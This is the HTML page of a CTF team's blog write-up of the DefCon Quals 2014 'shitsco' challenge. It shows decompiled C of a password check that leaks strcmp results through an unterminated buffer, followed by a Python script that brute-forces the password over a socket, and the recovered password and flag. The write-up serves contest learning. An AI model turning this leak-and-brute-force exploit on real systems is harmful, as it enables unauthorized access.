@@ -1,0 +1,619 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>DefCon Quals 2014 - shitsco - CaptchaFlag CTF Team</title>
+  <meta name="author" content="Captchaflag">
+
+  
+  <meta name="description" content="Analysis We are basically provided with a Cisco IOS-like CLI: 1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30 &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.captchaflag.com/blog/2014/05/23/defcon-quals-2014-shitsco/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="CaptchaFlag CTF Team" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-37376887-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">CaptchaFlag CTF Team</a></h1>
+  
+    <h2>Blog by the Captchaflag CTF Team</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.captchaflag.com" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">DefCon Quals 2014 - Shitsco</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-05-23T14:10:00-04:00" pubdate data-updated="true">May 23<span>rd</span>, 2014</time>
+        
+         | <a href="#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><h2>Analysis</h2>
+
+<p>We are basically provided with a Cisco IOS-like CLI:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@ubuntu:/home/shitsco<span class="nv">$ </span>~/Desktop/shitsco_c8b1aa31679e945ee64bde1bdb19d035
+</span><span class='line'>
+</span><span class='line'> oooooooo8 oooo        o88    o8
+</span><span class='line'>888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
+</span><span class='line'> 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
+</span><span class='line'>        888 888   888   888  888           888 888         888     888
+</span><span class='line'>o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88
+</span><span class='line'>
+</span><span class='line'>Welcome to Shitsco Internet Operating System <span class="o">(</span>IOS<span class="o">)</span>
+</span><span class='line'>For a <span class="nb">command </span>list, enter ?
+</span><span class='line'><span class="nv">$ </span>?
+</span><span class='line'><span class="o">==========</span>Available <span class="nv">Commands</span><span class="o">==========</span>
+</span><span class='line'>|enable                               |
+</span><span class='line'>|ping                                 |
+</span><span class='line'>|tracert                              |
+</span><span class='line'>|?                                    |
+</span><span class='line'>|shell                                |
+</span><span class='line'>|set                                  |
+</span><span class='line'>|show                                 |
+</span><span class='line'>|credits                              |
+</span><span class='line'>|quit                                 |
+</span><span class='line'><span class="o">======================================</span>
+</span><span class='line'>Type ? followed by a <span class="nb">command </span><span class="k">for </span>more detailed information
+</span><span class='line'><span class="nv">$ </span>? <span class="nb">enable</span>
+</span><span class='line'><span class="nb">enable</span>: Enables administrator access, with the correct password.
+</span><span class='line'><span class="nv">$ </span><span class="nb">enable </span>cisco
+</span><span class='line'>Nope.  The password isn<span class="s1">&#39;t cisco</span>
+</span><span class='line'><span class="s1">$ enable</span>
+</span><span class='line'><span class="s1">Please enter a password: cisco</span>
+</span><span class='line'><span class="s1">Nope.  The password isn&#39;</span>t ciscp�
+</span></code></pre></td></tr></table></div></figure>
+
+<p>After spending some time reversing and playing on the CLI, a few key points:</p>
+
+<ul>
+<li>in enable mode, you can run a command to print the flag (stored in file on disk)</li>
+<li>to get into enable mode you need to know the password (stored on disk and read into a global variable)</li>
+<li>there is a global boolean for whether you are in enable mode or not</li>
+<li>you can get a leak of the stack when you type &#8216;enable&#8217; without a password and let it ask you. if you password is 5+ chars, you&#8217;ll notice some data leaked</li>
+</ul>
+
+<h2>Reversing</h2>
+
+<p>Notice in the following code, they do not null terminate the password. When the password is wrong, the printf will leak stack data. Fortunately for us, the result of the strcmp() will be leaked. That will allow us to brute force the password.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">do_enable</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">a1</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// ebx@2</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">user_password</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [sp+18h] [bp-34h]@2</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">bMatch</span><span class="p">;</span> <span class="c1">// [sp+38h] [bp-14h]@3</span>
+</span><span class='line'>  <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+3Ch] [bp-10h]@1</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">a1</span> <span class="p">)</span>
+</span><span class='line'>  <span class="p">{</span>
+</span><span class='line'>    <span class="n">v1</span> <span class="o">=</span> <span class="n">user_password</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">strncpy</span><span class="p">(</span><span class="n">user_password</span><span class="p">,</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="mi">32u</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="k">else</span>
+</span><span class='line'>  <span class="p">{</span>
+</span><span class='line'>    <span class="n">v1</span> <span class="o">=</span> <span class="n">user_password</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Please enter a password: &quot;</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+</span><span class='line'>    <span class="n">get_password_from_user</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">user_password</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="sc">&#39;\n&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="n">bMatch</span> <span class="o">=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">g_enable_password</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="n">bMatch</span> <span class="p">)</span>
+</span><span class='line'>  <span class="p">{</span>
+</span><span class='line'>    <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Nope.  The password isn&#39;t %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">v1</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="k">else</span>
+</span><span class='line'>  <span class="p">{</span>
+</span><span class='line'>    <span class="n">g_enable_mode</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">g_prompt</span> <span class="o">=</span> <span class="sc">&#39;#&#39;</span><span class="p">;</span>
+</span><span class='line'>    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Authentication Successful&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="n">sub_8049090</span><span class="p">(</span><span class="n">a1</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">return</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__GS__</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">unsigned</span> <span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">get_password_from_user</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">,</span> <span class="kt">char</span> <span class="n">delim</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">count</span><span class="p">;</span> <span class="c1">// ebx@1</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">byte_read</span><span class="p">;</span> <span class="c1">// [sp+1Fh] [bp-1Dh]@3</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
+</span><span class='line'>  <span class="p">{</span>
+</span><span class='line'>    <span class="k">while</span> <span class="p">(</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte_read</span><span class="p">,</span> <span class="mi">1u</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
+</span><span class='line'>    <span class="p">{</span>
+</span><span class='line'>      <span class="k">if</span> <span class="p">(</span> <span class="n">byte_read</span> <span class="o">!=</span> <span class="n">delim</span> <span class="p">)</span>
+</span><span class='line'>      <span class="p">{</span>
+</span><span class='line'>        <span class="n">dest</span><span class="p">[</span><span class="n">count</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">byte_read</span><span class="p">;</span>
+</span><span class='line'>        <span class="k">if</span> <span class="p">(</span> <span class="n">count</span> <span class="o">!=</span> <span class="n">size</span> <span class="p">)</span>
+</span><span class='line'>          <span class="k">continue</span><span class="p">;</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>      <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="n">count</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+<h2>Code</h2>
+
+<p>The result of strcmp() will either be 1 or -1, depending on whether s1 or s2 is
+bigger. By filling the buffer will &#8216;\x01&#8217;, and guessing one character at a time
+from high to low, we will be able to determine the actual character when the leaked data byte changes.
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/env python</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">read<em>until</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">delim</span><span class="o">=</span><span class="s">&#39;$&#39;</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">line</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
+</span><span class='line'>  <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">b</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">b</span> <span class="o">==</span> <span class="n">delim</span><span class="p">:</span>
+</span><span class='line'>      <span class="k">break</span>
+</span><span class='line'>    <span class="n">line</span> <span class="o">+=</span> <span class="n">b</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">line</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">try</em>enable</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">guess</span> <span class="o">=</span> <span class="mi">128</span>
+</span><span class='line'>  <span class="k">while</span> <span class="n">guess</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;enable</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">read<em>until</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;:&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">password</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">guess</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="mi">31</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">))</span><span class="o">*</span><span class="s">&#39;</span><span class="se">\x01</span><span class="s">&#39;</span><span class="p">)</span>
+</span><span class='line'>    <span class="c"># find the first transition in which our guess</span>
+</span><span class='line'>    <span class="c"># is not higher than the target</span>
+</span><span class='line'>    <span class="k">if</span> <span class="n">read</em>until</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;$&#39;</span><span class="p">)[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span> <span class="o">!=</span> <span class="s">&#39;</span><span class="se">\xff</span><span class="s">&#39;</span><span class="p">:</span>
+</span><span class='line'>      <span class="n">password</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">guess</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;enable &quot;</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
+</span><span class='line'>      <span class="k">print</span> <span class="nb">repr</span><span class="p">(</span><span class="n">read<em>until</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;$&#39;</span><span class="p">))</span>
+</span><span class='line'>      <span class="k">return</span> <span class="n">password</span>
+</span><span class='line'>    <span class="n">guess</span> <span class="o">-=</span> <span class="mi">1</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+</span><span class='line'><span class="n">port</span> <span class="o">=</span> <span class="mi">31337</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;shitsco</em>c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me&#39;</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+</span><span class='line'><span class="n">done</span> <span class="o">=</span> <span class="bp">False</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># skip banner</span>
+</span><span class='line'><span class="n">read<em>until</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;$&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="n">password</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
+</span><span class='line'><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+</span><span class='line'>  <span class="n">password</span> <span class="o">=</span> <span class="n">try</em>enable</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">print</span> <span class="n">password</span>
+</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<h2>Solution</h2>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">enable </span>bruT3m3hard3rb4by
+</span><span class='line'>Authentication Successful
+</span><span class='line'><span class="c"># ?</span>
+</span><span class='line'><span class="o">==========</span>Available <span class="nv">Commands</span><span class="o">==========</span>
+</span><span class='line'>|enable                               |
+</span><span class='line'>|ping                                 |
+</span><span class='line'>|tracert                              |
+</span><span class='line'>|?                                    |
+</span><span class='line'>|flag                                 |
+</span><span class='line'>|shell                                |
+</span><span class='line'>|set                                  |
+</span><span class='line'>|show                                 |
+</span><span class='line'>|credits                              |
+</span><span class='line'>|quit                                 |
+</span><span class='line'>|disable                              |
+</span><span class='line'><span class="o">======================================</span>
+</span><span class='line'>Type ? followed by a <span class="nb">command </span><span class="k">for </span>more detailed information
+</span><span class='line'><span class="c"># flag</span>
+</span><span class='line'>The flag is: Dinosaur vaginas
+</span></code></pre></td></tr></table></div></figure>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">stacks0n</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-05-23T14:10:00-04:00" pubdate data-updated="true">May 23<span>rd</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/bruteforce/'>bruteforce</a>, <a class='category' href='/blog/categories/reversing-/'>reversing,</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://www.captchaflag.com/blog/2014/05/23/defcon-quals-2014-shitsco/" data-via="captchaflag" data-counturl="http://www.captchaflag.com/blog/2014/05/23/defcon-quals-2014-shitsco/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/05/23/defcon-quals-2014-babysfirst-heap/" title="Previous Post: DefCon Quals 2014 - babysfirst heap">&laquo; DefCon Quals 2014 - babysfirst heap</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/10/23/hack-dot-lu-2014-personnel-database/" title="Next Post: Hack.lu 2014 - Personnel Database">Hack.lu 2014 - Personnel Database &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/10/28/hack-dot-lu-2014-guess-the-flag/">Hack.lu 2014 - Guess the Flag</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/24/hack-dot-lu-2014-daltons-corporate-security-safe-for-business/">Hack.lu 2014 - Dalton's Corporate Security Safe for Business</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/24/hack-dot-lu-2014-douchemac/">Hack.lu 2014 - Douchemac</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/24/hack-dot-lu-2014-imageupload/">Hack.lu 2014 - ImageUpload</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/23/hack-dot-lu-2014-wiener/">Hack.lu 2014 - wiener</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <li class="loading">Status updating...</li>
+  </ul>
+  <script type="text/javascript">
+    $.domReady(function(){
+      getTwitterFeed("captchaflag", 4, false);
+    });
+  </script>
+  <script src="/javascripts/twitter.js" type="text/javascript"> </script>
+  
+    <a href="http://twitter.com/captchaflag" class="twitter-follow-button" data-show-count="false">Follow @captchaflag</a>
+  
+</section>
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Captchaflag -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'captchaflag';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://www.captchaflag.com/blog/2014/05/23/defcon-quals-2014-shitsco/';
+        var disqus_url = 'http://www.captchaflag.com/blog/2014/05/23/defcon-quals-2014-shitsco/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
